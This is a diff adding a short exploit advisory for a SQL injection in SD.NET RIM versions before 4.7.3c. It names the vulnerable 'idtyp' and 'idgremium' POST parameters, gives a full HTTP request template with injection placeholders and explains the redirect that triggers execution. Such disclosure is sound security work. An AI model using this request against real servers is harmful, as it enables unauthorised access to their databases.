@@ -1,0 +1,30 @@
+# Exploit Title: SD.NET RIM 4.7.3c - 'idtyp' SQL Injection
+# Date: 2019-11-05
+# Exploit Author: Fabian Mosch (r-tec IT Security GmbH)
+# Vendor Homepage: https://www.sitzungsdienst.net/
+# Software Link: https://www.sitzungsdienst.net/2018/12/sd-net-rim-4-7-3-veroeffentlicht/
+# Version: < 4.7.3c
+# Tested on: < 4.7.3c
+# CVE : N/A
+
+# SD.NET RIM before version 4.7.3c is vulnerable to a SQL-Injection vulnerability. To Exploit the vulnerability 
+# an attacker has to inject arbitrary SQL Statements in the following POST parameters:
+
+POST /vorlagen/?__=SOMEBASE64 HTTP/1.1
+Host: VulnerableHost.com
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 182
+Origin: https://vulnerablehost.com
+Connection: close
+Referer: https://vulnerablehost.com/vorlagen/?__=BASE64
+Cookie: PHPSESSID250=SESSIONID
+Upgrade-Insecure-Requests: 1
+
+reqid=f48de4c24ae1b72dd37ebde6f6b40544&nummer=t&idtyp=-1’INJECTHERE&idgremium=-1’INJECTHERE&datefrom=TT.MM.JJJJ&dateto=TT.MM.JJJJ&csrftoken=CSRFToken
+
+# The attacker is then redirected with a 302 redirect to an URL /templates/?__=NEWBASE64 as GET request. 
+# By issuing the second request the arbitrary SQL-Statement gets executed.
